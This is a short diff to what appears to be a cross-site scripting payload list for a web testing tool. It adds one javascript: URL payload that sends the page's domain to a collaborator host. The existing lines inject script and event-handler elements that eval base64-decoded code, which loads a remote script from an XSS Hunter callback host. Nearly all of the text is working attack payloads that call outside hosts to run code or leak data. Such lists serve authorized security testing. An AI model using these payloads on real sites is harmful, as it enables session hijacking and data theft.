@@ -1,4 +1,5 @@
 "><script src=!-VARIABLE_XSS_HUNTER-!></script>
+javascript://https://target.com/x%0Aeval(atob(unescape('<@base64url>window.location="!-VARIABLE_COLLABORATOR-!/?domain="+document.domain<@/base64url>')))
 javascript:eval('var a=document.createElement(\'script\');a.src=\'!-VARIABLE_XSS_HUNTER-!\';document.body.appendChild(a)')
 "><input onfocus=eval(atob(this.id)) id=<@base64url>var a=document.createElement("script");a.src="!-VARIABLE_XSS_HUNTER-!";document.body.appendChild(a);<@/base64url> autofocus>
 "><img src id=<@base64url>var a=document.createElement("script");a.src="!-VARIABLE_XSS_HUNTER-!";document.body.appendChild(a);<@/base64url> onerror=eval(atob(this.id))>
